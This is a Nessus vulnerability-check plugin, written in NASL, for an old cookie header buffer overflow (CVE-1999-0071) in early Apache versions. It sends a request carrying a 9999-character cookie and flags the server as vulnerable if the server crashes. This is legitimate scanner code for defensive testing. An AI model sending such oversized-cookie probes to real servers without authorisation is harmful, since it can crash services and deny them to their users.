#
# (C) Tenable Network Security, Inc.
#

# *untested*
#
# Affected:
# Apache < 1.1
#

include("compat.inc");

if (description)
{
 script_id(11077);
 script_version("$Revision: 1.31 $");
 script_cvs_date("$Date: 2014/05/27 00:36:24 $");

 script_cve_id("CVE-1999-0071");
 script_osvdb_id(9717);

 script_name(english:"Web Server HTTP Cookie Header Remote Overflow");
 script_summary(english:"Tries to overflow the cookie buffer");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a remote buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid request
with a long cookie name or value.

An attacker may exploit this vulnerability to make the web server
crash continually or even execute arbitrary code.

This is known to affect early versions of Apache and may also affect
additional web servers.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1997/Jan/0044.html");
 script_set_attribute(attribute:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_set_attribute(attribute:"vuln_publication_date", value:"1997/09/01");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/14");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.

 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl", "no404.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80, embedded: 1);
if (http_is_dead(port: port)) exit(0);

# If the server sends us a cookie, we will reply with it...
# Slightly modified :-)
init_cookiejar();
r = http_send_recv3(method: "GET", item:"/", port: port);

if (! egrep(string: r[1], pattern: "^Set-Cookie2?:", icase: 1))
  set_http_cookie(name: rand_str(), value: "test");
replace_http_cookies(new_value: crap(9999));

r = http_send_recv3(method: "GET", item:"/", port: port);

init_cookiejar();	# Remove the polluted cookies
if (http_is_dead(port: port, retry: 3)) { security_hole(port); exit(0); }
